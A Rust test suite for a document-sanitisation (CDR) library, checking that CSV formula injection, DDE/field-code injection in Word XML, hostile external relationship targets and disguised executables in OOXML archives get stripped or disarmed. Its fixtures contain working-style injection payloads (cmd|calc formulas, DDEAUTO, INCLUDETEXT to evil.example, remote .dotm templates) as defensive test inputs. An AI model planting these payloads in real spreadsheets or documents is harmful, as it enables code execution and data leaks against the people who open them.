//! Behavioral & Adversarial Verification Suite for Master Security Hardening Plan v3
//! Sub-Phase 1.1 (`CSE-19`, `F-04`, `F-06`): `T44` and `T45`.

use sentinel_cdr::sanitizers::openxml::OpenXmlSanitizer;
use sentinel_cdr::sanitizers::text::TextCsvSanitizer;
use sentinel_cdr::{CdrEngine, CdrError, DetectedFormat, SanitizationPolicy};
use std::io::{Cursor, Read, Write};
use zip::write::SimpleFileOptions;
use zip::{ZipArchive, ZipWriter};

fn build_zip(entries: &[(&str, &[u8])]) -> Vec<u8> {
    let mut buf = Vec::new();
    {
        let mut writer = ZipWriter::new(Cursor::new(&mut buf));
        let opts = SimpleFileOptions::default();
        for (name, data) in entries {
            writer.start_file(*name, opts).expect("start zip entry");
            writer.write_all(data).expect("write zip entry");
        }
        writer.finish().expect("finish zip");
    }
    buf
}

fn read_zip_string(zip_bytes: &[u8], entry_name: &str) -> String {
    let mut archive = ZipArchive::new(Cursor::new(zip_bytes)).expect("open clean zip");
    let mut entry = archive.by_name(entry_name).expect("find zip entry");
    let mut s = String::new();
    entry.read_to_string(&mut s).expect("read utf8 entry");
    s
}

fn make_minimal_png_bytes() -> Vec<u8> {
    let img = image::RgbaImage::from_pixel(2, 2, image::Rgba([10, 20, 30, 255]));
    let mut out = Cursor::new(Vec::new());
    image::DynamicImage::ImageRgba8(img)
        .write_to(&mut out, image::ImageFormat::Png)
        .expect("encode png");
    out.into_inner()
}

#[test]
fn t44_csv_rfc4180_signed_numbers_preserved_quoted_formulas_disarmed() {
    // 1. Valid signed number predicate matches RFC/spreadsheet numeric grammar strictly
    for valid_num in [
        "-45000.00",
        "+3.14",
        "-0.5",
        ".25",
        "-.5",
        "+42.",
        "+1.25e-4",
        "-9E+2",
        "0",
    ] {
        assert!(
            TextCsvSanitizer::is_valid_signed_number(valid_num),
            "Expected '{valid_num}' to be recognized as a valid signed number"
        );
        assert!(
            !TextCsvSanitizer::is_dangerous_csv_cell(valid_num),
            "Valid signed number '{valid_num}' must NOT be flagged as dangerous"
        );
    }

    for dangerous in [
        "-1+cmd|' /C calc'!A0",
        "+2+3+cmd|' /C calc'!A0",
        "=HYPERLINK(\"http://evil\",\"Click\")",
        "@SUM(1+1)*cmd|' /C calc'!A0",
        "\t=1+1",
        "\r=1+1",
        " \t-45000.00",
        "-SUM(A1:A5)",
        "+cmd|'/C calc'!A0",
        "-1e",
        "-.",
    ] {
        assert!(
            TextCsvSanitizer::is_dangerous_csv_cell(dangerous),
            "Expected '{dangerous}' to be flagged as dangerous CSV formula trigger"
        );
    }

    // 2. End-to-end RFC 4180 CSV sanitization preserves signed numbers, commas/newlines/quotes
    //    inside quoted fields, and disarms BOTH unquoted and quoted formulas cleanly.
    let engine = CdrEngine::new(SanitizationPolicy::default());
    let csv_input = concat!(
        "Account,Balance,Delta,Company,Notes,Payload1,Payload2,Payload3,Payload4\n",
        "ACC-01,-45000.00,+3.14,\"Acme, Inc.\",\"Line 1\nLine 2 \"\"ok\"\"\",",
        "\"=HYPERLINK(\"\"http://evil\"\",\"\"Click\"\")\",",
        "\"=cmd|' /C calc'!A0\",",
        "-1+cmd|' /C calc'!A0,",
        "\"@SUM(1+1)*cmd|' /C calc'!A0\"\n",
        "ACC-02,\"-45000.00\",-1.5e-3,\"Safe, Ltd.\",ok,+2+3+cmd|' /C calc'!A0,\"-1+cmd|' /C calc'!A0\",\t=1+1,\"\t=2+2\"\n"
    );

    let (clean_bytes, report) = engine
        .sanitize_with_policy_report(csv_input.as_bytes(), engine.policy(), "ledger.csv")
        .expect("RFC 4180 CSV sanitization must succeed");
    assert_eq!(report.format, DetectedFormat::Csv);
    assert!(report.was_modified);

    let clean_str = String::from_utf8(clean_bytes).expect("utf8 output");

    // Signed numbers preserved untouched (NO apostrophe corruption!)
    assert!(
        clean_str.contains("ACC-01,-45000.00,+3.14,"),
        "Signed financial numbers -45000.00 and +3.14 must stay untouched; got:\n{clean_str}"
    );
    assert!(
        !clean_str.contains("'-45000.00") && !clean_str.contains("'+3.14"),
        "Signed numbers must never be corrupted with leading apostrophes; got:\n{clean_str}"
    );
    assert!(
        clean_str.contains("ACC-02,\"-45000.00\",-1.5e-3,"),
        "Quoted signed number and scientific notation must stay untouched; got:\n{clean_str}"
    );

    // Quoted comma, embedded newline, and escaped quotes preserved per RFC 4180
    assert!(clean_str.contains("\"Acme, Inc.\""));
    assert!(clean_str.contains("\"Line 1\nLine 2 \"\"ok\"\"\""));

    // Quoted AND unquoted formula triggers disarmed while preserving valid RFC 4180 quoting
    assert!(clean_str.contains("\"'=HYPERLINK(\"\"http://evil\"\",\"\"Click\"\")\""));
    assert!(clean_str.contains("\"'=cmd|' /C calc'!A0\""));
    assert!(clean_str.contains(",'-1+cmd|' /C calc'!A0,"));
    assert!(clean_str.contains("\"'@SUM(1+1)*cmd|' /C calc'!A0\""));
    assert!(clean_str.contains(",'+2+3+cmd|' /C calc'!A0,"));
    assert!(clean_str.contains("\"\'-1+cmd|' /C calc'!A0\""));
    assert!(clean_str.contains(",'\t=1+1,"));
    assert!(clean_str.contains("\"'\t=2+2\""));

    // Post-CDR RFC 4180 verifier accepts clean output and rejects raw dirty CSV
    TextCsvSanitizer::verify_csv_fields_clean(&clean_str)
        .expect("Sanitized CSV must pass RFC 4180 clean verification");
    assert!(
        TextCsvSanitizer::verify_csv_fields_clean(csv_input).is_err(),
        "Unsanitized CSV with quoted/unquoted formulas must be rejected by verifier"
    );

    // 3. Malformed RFC 4180 CSV (unclosed quote or stray quote in unquoted field) fails closed
    let unclosed_quote = b"Col1,Col2\n\"=cmd|' /C calc'!A0";
    let err_unclosed = engine
        .sanitize_with_policy_report(unclosed_quote, engine.policy(), "bad.csv")
        .expect_err("Unclosed RFC 4180 quote must fail closed");
    assert!(matches!(err_unclosed, CdrError::ParserCorruption(_)));

    let stray_quote = b"Col1,Col2\nfoo,bar\"baz\n";
    let err_stray = engine
        .sanitize_with_policy_report(stray_quote, engine.policy(), "stray.csv")
        .expect_err("Stray quote in unquoted CSV field must fail closed");
    assert!(matches!(err_stray, CdrError::ParserCorruption(_)));
}

#[test]
fn t45_ooxml_scoped_rels_entity_smuggle_split_dde_and_part_allowlist() {
    let engine = CdrEngine::new(SanitizationPolicy::default());

    // 1. Per-part `.rels` scoping: stripping `rId1` in `sheet1` must NOT break `rId1` in `sheet2`
    let dual_sheet_xlsx = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/xl/workbook.xml" ContentType="application/vnd.ms-excel.sheet.macroEnabled.main+xml"/>
  <Override PartName="/xl/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#,
        ),
        (
            "xl/workbook.xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><workbook/>"#,
        ),
        ("xl/vbaProject.bin", b"FAKE_VBA_PROJECT"),
        (
            "xl/worksheets/sheet1.xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><hyperlinks><hyperlink ref="A1" r:id="rId1"/></hyperlinks></worksheet>"#,
        ),
        (
            "xl/worksheets/_rels/sheet1.xml.rels",
            br##"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#102;ile://evil/share" TargetMode="External"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#x66;ile:///C:/Windows/win.ini" TargetMode="External"/>
  <Relationship Id="rId3" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="smb://10.0.0.5/drop" TargetMode="External"/>
  <Relationship Id="rId4" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mhtml:https://evil.example/x.mht!x" TargetMode="External"/>
  <Relationship Id="rId5" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="search-ms:query=secrets" TargetMode="External"/>
  <Relationship Id="rId6" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="ms-appinstaller:?source=https://evil/a" TargetMode="External"/>
  <Relationship Id="rId7" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="&#x09;https://evil.example/tab" TargetMode="External"/>
  <Relationship Id="rId8" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="mailto:ops@example.com" TargetMode="External"/>
  <Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.com/ok?a=1&amp;b=2" TargetMode="External"/>
  <Relationship Id="rId10" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="#SummaryTab" TargetMode="External"/>
</Relationships>"##,
        ),
        (
            "xl/worksheets/sheet2.xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><worksheet xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><hyperlinks><hyperlink ref="B2" r:id="rId1"/></hyperlinks></worksheet>"#,
        ),
        (
            "xl/worksheets/_rels/sheet2.xml.rels",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://docs.example.com/sheet2-safe" TargetMode="External"/>
</Relationships>"#,
        ),
    ]);

    let (clean_xlsx, report_xlsx) = engine
        .sanitize_with_policy_report(&dual_sheet_xlsx, engine.policy(), "finance.xlsm")
        .expect("Dual-sheet xlsm sanitization must succeed");

    // Macro-stripped `.xlsm` upgrades ContentType AND records `recommended_extension: Some("xlsx")`
    assert_eq!(report_xlsx.format, DetectedFormat::Xlsx);
    assert_eq!(
        report_xlsx.recommended_extension.as_deref(),
        Some("xlsx"),
        "Macro-stripped .xlsm must recommend .xlsx extension"
    );
    let ct_xml = read_zip_string(&clean_xlsx, "[Content_Types].xml");
    assert!(
        ct_xml
            .contains("application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml")
            && !ct_xml.contains("macroEnabled"),
        "[Content_Types].xml must be upgraded to standard xlsx ContentType"
    );

    // Sheet 1's malicious rId1..rId7 stripped; rId8..rId10 allowlisted preserved
    let sheet1_rels = read_zip_string(&clean_xlsx, "xl/worksheets/_rels/sheet1.xml.rels");
    for blocked_id in ["rId1", "rId2", "rId3", "rId4", "rId5", "rId6", "rId7"] {
        assert!(
            !sheet1_rels.contains(&format!("Id=\"{blocked_id}\"")),
            "Disallowed/entity-smuggled relationship {blocked_id} must be stripped from sheet1.xml.rels:\n{sheet1_rels}"
        );
    }
    assert!(sheet1_rels.contains("mailto:ops@example.com"));
    assert!(sheet1_rels.contains("https://example.com/ok?a=1&amp;b=2"));
    assert!(sheet1_rels.contains("#SummaryTab"));

    let sheet1_xml = read_zip_string(&clean_xlsx, "xl/worksheets/sheet1.xml");
    assert!(
        !sheet1_xml.contains("rId1"),
        "Dangling rId1 in sheet1.xml must be stripped"
    );

    // Sheet 2's benign `rId1` MUST remain 100% intact (proves per-part `.rels` scoping!)
    let sheet2_rels = read_zip_string(&clean_xlsx, "xl/worksheets/_rels/sheet2.xml.rels");
    let sheet2_xml = read_zip_string(&clean_xlsx, "xl/worksheets/sheet2.xml");
    assert!(
        sheet2_rels.contains("Id=\"rId1\"")
            && sheet2_rels.contains("https://docs.example.com/sheet2-safe"),
        "Benign rId1 in sheet2.xml.rels must be preserved:\n{sheet2_rels}"
    );
    assert!(
        sheet2_xml.contains("r:id=\"rId1\""),
        "Benign r:id=\"rId1\" in sheet2.xml must NOT be deleted when sheet1's rId1 is removed:\n{sheet2_xml}"
    );

    // 2. Split-run DDE / INCLUDETEXT / INCLUDEPICTURE / entity DDE & allowlist-only binary parts in `.docm`
    let clean_png = make_minimal_png_bytes();
    let docx_xml = br#"<?xml version="1.0" encoding="UTF-8"?>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>Addendum: middle section remains untouched.</w:t></w:r></w:p>
    <w:p>
      <w:r><w:fldChar w:fldCharType="begin"/></w:r>
      <w:r><w:instrText>DD</w:instrText></w:r>
      <w:r><w:instrText>EAUTO </w:instrText></w:r>
      <w:r><w:instrText>c:\\windows\\system32\\cmd.exe "/k calc"</w:instrText></w:r>
      <w:r><w:fldChar w:fldCharType="end"/></w:r>
    </w:p>
    <w:p>
      <w:r><w:instrText>INCLUDE</w:instrText></w:r>
      <w:r><w:instrText>TEXT "https://evil.example/leak"</w:instrText></w:r>
    </w:p>
    <w:p>
      <w:r><w:instrText>INCLUDE</w:instrText></w:r>
      <w:r><w:instrText>PICTURE "https://evil.example/track.png"</w:instrText></w:r>
    </w:p>
    <w:p>
      <w:r><w:instrText>&#68;DEAUTO calc</w:instrText></w:r>
    </w:p>
    <w:p>
      <w:r><w:t>DD</w:t></w:r>
      <w:r><w:t>EAUTO powershell.exe</w:t></w:r>
    </w:p>
    <w:p>
      <w:fldSimple w:instr="&#68;DEAUTO calc.exe"/>
    </w:p>
  </w:body>
</w:document>"#;

    assert!(
        OpenXmlSanitizer::has_residual_dde_or_field_code(docx_xml)
            .expect("detect split-run DDE on raw xml"),
        "Raw split-run XML must trigger DDE/field-code detector"
    );

    let dirty_docm = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.ms-word.document.macroEnabled.main+xml"/>
  <Override PartName="/word/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#,
        ),
        ("word/document.xml", docx_xml),
        ("word/vbaProject.bin", b"VBA_STREAM"),
        ("word/media/icon.png", &clean_png),
        ("word/printerSettings/printerSettings1.bin", b"BENIGN_DEVMODE"),
        ("word/printerSettings/printerSettings2.bin", b"MZ\x90\x00DISGUISED_PE"),
        ("word/media/vector.wmf", &[0xD7, 0xCD, 0xC6, 0x9A, 0x00, 0x00]),
        ("word/media/vector.emf", b"EMF_BYTES"),
        ("word/custom_blob.bin", b"ARBITRARY_BIN"),
        ("word/dropper.exe", b"MZ\x90\x00PE"),
        ("word/script.ps1", b"Write-Host pwn"),
        ("word/object.ole", b"OLE_DATA"),
        ("word/ctrl.activex", b"ACTIVEX_DATA"),
    ]);

    let (clean_docx, report_docx) = engine
        .sanitize_with_policy_report(&dirty_docm, engine.policy(), "brief.docm")
        .expect("Dirty .docm sanitization must succeed");
    assert_eq!(report_docx.recommended_extension.as_deref(), Some("docx"));

    let clean_doc_xml = read_zip_string(&clean_docx, "word/document.xml");
    assert!(
        clean_doc_xml.contains("Addendum: middle section remains untouched."),
        "Normal prose containing 'dd'/'dde' inside words must NOT be mangled:\n{clean_doc_xml}"
    );
    assert!(
        !OpenXmlSanitizer::has_residual_dde_or_field_code(clean_doc_xml.as_bytes())
            .expect("verify clean doc xml"),
        "Sanitized document.xml must contain zero residual split-run DDE or field codes:\n{clean_doc_xml}"
    );
    assert!(clean_doc_xml.contains("REM_DISARMED"));

    let mut clean_archive = ZipArchive::new(Cursor::new(&clean_docx)).expect("open clean docx");
    for stripped in [
        "word/vbaProject.bin",
        "word/printerSettings/printerSettings2.bin",
        "word/media/vector.wmf",
        "word/media/vector.emf",
        "word/custom_blob.bin",
        "word/dropper.exe",
        "word/script.ps1",
        "word/object.ole",
        "word/ctrl.activex",
    ] {
        assert!(
            clean_archive.by_name(stripped).is_err(),
            "Prohibited/non-allowlisted part '{stripped}' must be stripped from OOXML"
        );
    }
    assert!(clean_archive.by_name("word/media/icon.png").is_ok());
    assert!(clean_archive
        .by_name("word/printerSettings/printerSettings1.bin")
        .is_ok());

    // 3. Macro-stripped `.pptm` recommends `pptx`
    let dirty_pptm = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/ppt/presentation.xml" ContentType="application/vnd.ms-powerpoint.presentation.macroEnabled.main+xml"/>
  <Override PartName="/ppt/vbaProject.bin" ContentType="application/vnd.ms-office.vbaProject"/>
</Types>"#,
        ),
        ("ppt/presentation.xml", br#"<?xml version="1.0" encoding="UTF-8"?><presentation/>"#),
        ("ppt/vbaProject.bin", b"PPT_VBA"),
    ]);
    let (_clean_pptx, report_pptx) = engine
        .sanitize_with_policy_report(&dirty_pptm, engine.policy(), "deck.pptm")
        .expect("Dirty .pptm sanitization must succeed");
    assert_eq!(report_pptx.recommended_extension.as_deref(), Some("pptx"));

    // 4. Generic ZIP nesting (`allow_generic_zip = true`): prohibited binary parts MUST STILL be stripped
    let zip_policy = SanitizationPolicy {
        allow_generic_zip: true,
        ..Default::default()
    };
    let generic_zip = build_zip(&[
        (
            "safe.csv",
            b"Amount,Formula\n-45000.00,\"=cmd|' /C calc'!A0\"\n",
        ),
        ("evil.wmf", &[0xD7, 0xCD, 0xC6, 0x9A, 0x01, 0x02]),
        ("evil.emf", b"EMF_PAYLOAD"),
        ("evil.bin", b"RAW_BIN"),
        ("evil.exe", b"MZ\x90\x00EXE"),
        ("evil.ps1", b"Invoke-WebRequest"),
        ("evil.ole", b"OLE_BYTES"),
        ("evil.activex", b"AX_BYTES"),
    ]);
    let (clean_zip, _zip_report) = engine
        .sanitize_with_policy_report(&generic_zip, &zip_policy, "bundle.zip")
        .expect("Generic ZIP with allow_generic_zip=true must sanitize cleanly");
    let mut z = ZipArchive::new(Cursor::new(&clean_zip)).expect("open sanitized generic zip");
    for stripped in [
        "evil.wmf",
        "evil.emf",
        "evil.bin",
        "evil.exe",
        "evil.ps1",
        "evil.ole",
        "evil.activex",
    ] {
        assert!(
            z.by_name(stripped).is_err(),
            "Prohibited binary part '{stripped}' must be stripped even inside generic ZIP"
        );
    }
    let nested_csv = read_zip_string(&clean_zip, "safe.csv");
    assert!(nested_csv.contains("-45000.00"));
    assert!(nested_csv.contains("\"'=cmd|' /C calc'!A0\""));

    // 5. Post-CDR `verify_sanitized_output` MUST reject residual non-allowlisted OOXML parts,
    //    magic-spoofed static media (`word/media/spoofed.bmp` with MZ header), and generic ZIP PE blobs
    let residual_ooxml_dat = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>"#,
        ),
        ("word/document.xml", br#"<w:document/>"#),
        ("word/payload.dat", b"UNKNOWN_BINARY_PART"),
    ]);
    assert!(
        matches!(
            CdrEngine::verify_sanitized_output(
                &residual_ooxml_dat,
                DetectedFormat::Docx,
                engine.policy()
            ),
            Err(CdrError::OutputRejected(_))
        ),
        "verify_sanitized_output must reject residual non-allowlisted OOXML binary part word/payload.dat"
    );

    let spoofed_bmp_ooxml = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>"#,
        ),
        ("word/document.xml", br#"<w:document/>"#),
        ("word/media/spoofed.bmp", b"MZ\x90\x00PE_DISGUISED_AS_BMP"),
    ]);
    assert!(
        matches!(
            CdrEngine::verify_sanitized_output(
                &spoofed_bmp_ooxml,
                DetectedFormat::Docx,
                engine.policy()
            ),
            Err(CdrError::OutputRejected(_))
        ),
        "verify_sanitized_output must reject magic-spoofed PE disguised as word/media/spoofed.bmp"
    );

    let spoofed_generic_zip = build_zip(&[("dropper.dat", b"MZ\x90\x00PE_IN_GENERIC_ZIP")]);
    assert!(
        matches!(
            CdrEngine::verify_sanitized_output(
                &spoofed_generic_zip,
                DetectedFormat::ArchiveZip,
                &zip_policy
            ),
            Err(CdrError::OutputRejected(_))
        ),
        "verify_sanitized_output must reject PE-magic blob dropper.dat inside generic ZIP"
    );

    // 6. Adversarial regression checks (Full Phase 1 Cold-Eye):
    //    a) Leading UTF-8 BOM `\u{FEFF}` hiding CSV formula MUST be detected and disarmed
    let bom_csv = "\u{FEFF}=cmd|' /C calc'!A0,safe\n\"\u{FEFF}+1+cmd|' /C calc'!A0\",-45000.00\n";
    let (clean_bom_csv, _) = engine
        .sanitize_with_policy_report(bom_csv.as_bytes(), engine.policy(), "bom.csv")
        .expect("UTF-8 BOM CSV must sanitize cleanly");
    let clean_bom_str = std::str::from_utf8(&clean_bom_csv).expect("UTF-8");
    assert!(
        clean_bom_str.starts_with("'=cmd|' /C calc'!A0,safe\n"),
        "BOM-prefixed unquoted formula must be neutralized: {clean_bom_str:?}"
    );
    assert!(
        clean_bom_str.contains("\"'"),
        "BOM-prefixed quoted formula must be neutralized: {clean_bom_str:?}"
    );
    assert!(
        clean_bom_str.contains("-45000.00"),
        "Valid signed number must remain intact: {clean_bom_str:?}"
    );

    //    b) Split-run `CDATA` DDE across `<w:instrText>` MUST be neutralized AND caught by verifier
    let cdata_dde_docx = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>"#,
        ),
        (
            "word/document.xml",
            br#"<w:document><w:body><w:p><w:r><w:instrText><![CDATA[DD]]></w:instrText></w:r><w:r><w:instrText><![CDATA[EAUTO calc]]></w:instrText></w:r></w:p></w:body></w:document>"#,
        ),
    ]);
    assert!(
        matches!(
            CdrEngine::verify_sanitized_output(
                &cdata_dde_docx,
                DetectedFormat::Docx,
                engine.policy()
            ),
            Err(CdrError::OutputRejected(_))
        ),
        "verify_sanitized_output must reject split-run CDATA DDEAUTO"
    );
    let (clean_cdata_docx, cdata_report) = engine
        .sanitize_with_policy_report(&cdata_dde_docx, engine.policy(), "cdata_dde.docx")
        .expect("Split-run CDATA DDE DOCX must sanitize cleanly");
    let clean_cdata_doc = read_zip_string(&clean_cdata_docx, "word/document.xml");
    assert!(
        !clean_cdata_doc.contains("EAUTO") && clean_cdata_doc.contains("REM_DISARMED"),
        "Split-run CDATA DDEAUTO must be disarmed; got: {clean_cdata_doc}"
    );
    assert!(cdata_report
        .stripped_elements
        .iter()
        .any(|i| i.element_type == "DDE_FORMULA_INJECTION"));

    //    c) Omitted `TargetMode="External"` with an explicit `https://` scheme on `attachedTemplate`
    //       MUST be stripped by sanitizer AND rejected by `verify_sanitized_output`
    assert!(
        !OpenXmlSanitizer::is_allowed_ooxml_relationship_target(
            "https://evil.example/a.dotm",
            false
        ),
        "Explicit https:// scheme without TargetMode=\"External\" must be rejected"
    );
    let omitted_mode_docx = build_zip(&[
        (
            "[Content_Types].xml",
            br#"<?xml version="1.0" encoding="UTF-8"?><Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types"/>"#,
        ),
        ("word/document.xml", br#"<w:document/>"#),
        (
            "word/_rels/document.xml.rels",
            br#"<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/a.dotm"/>
  <Relationship Id="rId2" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/styles" Target="styles.xml"/>
</Relationships>"#,
        ),
    ]);
    assert!(
        matches!(
            CdrEngine::verify_sanitized_output(
                &omitted_mode_docx,
                DetectedFormat::Docx,
                engine.policy()
            ),
            Err(CdrError::OutputRejected(_))
        ),
        "verify_sanitized_output must reject https:// attachedTemplate omitting TargetMode=\"External\""
    );
    let (clean_omitted_docx, _) = engine
        .sanitize_with_policy_report(&omitted_mode_docx, engine.policy(), "omitted_mode.docx")
        .expect("Omitted TargetMode external template DOCX must sanitize cleanly");
    let clean_omitted_rels = read_zip_string(&clean_omitted_docx, "word/_rels/document.xml.rels");
    assert!(
        !clean_omitted_rels.contains("evil.example") && clean_omitted_rels.contains("styles.xml"),
        "External https:// attachedTemplate omitting TargetMode must be stripped while styles.xml stays: {clean_omitted_rels}"
    );
}
